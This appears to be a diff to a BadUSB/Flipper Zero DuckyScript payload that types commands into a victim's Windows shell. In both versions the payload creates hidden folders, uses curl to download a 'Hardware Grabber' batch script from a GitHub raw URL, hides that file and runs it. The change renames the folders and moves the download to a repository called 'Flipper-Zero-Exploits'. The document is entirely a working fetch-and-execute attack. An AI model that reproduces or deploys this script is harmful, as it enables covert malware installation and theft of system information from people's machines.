@@ -7,23 +7,31 @@ ENTER
 STRING cd ../../
 ENTER
 
-STRING mkdir Deez
+STRING mkdir BadUsbExploits
 ENTER
 
-STRING attrib +h Deez
+STRING attrib +h BadUsbExploits
 ENTER
 
-STRING cd Deez
+STRING cd BadUsbExploits
 ENTER
 
-STRING type nul > Nuts.bat
+STRING mkdir Batch-Testing
 ENTER
 
-STRING curl https://raw.githubusercontent.com/Wojtek9388/Batch-Testing/refs/heads/main/Hardware%20Grabber/System-Hardware.bat > Nuts.bat
+STRING attrib +h Batch-Testing
 ENTER
 
-STRING attrib +h Nuts.bat
+STRING cd Batch-Testing
+
+STRING type nul > BatchScript.bat
 ENTER
 
-STRING start Nuts.bat && exit
+STRING curl https://raw.githubusercontent.com/Wojtek9388/Flipper-Zero-Exploits/refs/heads/main/Hardware%20Grabber/System-Hardware.bat > BatchScript.bat
+ENTER
+
+STRING attrib +h BatchScript.bat
+ENTER
+
+STRING start BatchScript.bat && exit
 ENTER
